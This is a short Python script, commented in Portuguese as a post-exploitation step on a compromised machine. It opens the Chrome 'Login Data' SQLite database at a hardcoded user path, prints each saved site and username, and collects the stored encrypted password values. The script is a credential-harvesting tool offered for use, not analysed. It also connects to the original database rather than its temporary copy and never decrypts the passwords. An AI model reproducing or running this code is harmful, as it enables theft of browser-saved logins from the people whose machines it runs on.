# fase de pós exploitação consiste em explorar o sistema comprometido em busca de informações sensíveis
# as senhas do chrome ficam salvas em um sqlite criptografado
import os, sqlite3, shutil


def pw_acess():
    info = {}
    dblocal = "/home/marcus/.config/google-chrome/Default/Login Data"
    banco2 = dblocal + "2"
    shutil.copyfile(dblocal, banco2)
    conn = sqlite3.connect(dblocal)
    cursor = conn.cursor()
    cursor.execute("select origin_url, username_value, password_value from logins")
    for site, login, senha in cursor.fetchall():
        print(f"Site: {site}\nLogin: {login}")
        info.setdefault(site, senha)
    conn.close()
    os.remove(banco2)
    return info


if __name__ == '__main__':
    pw_acess()
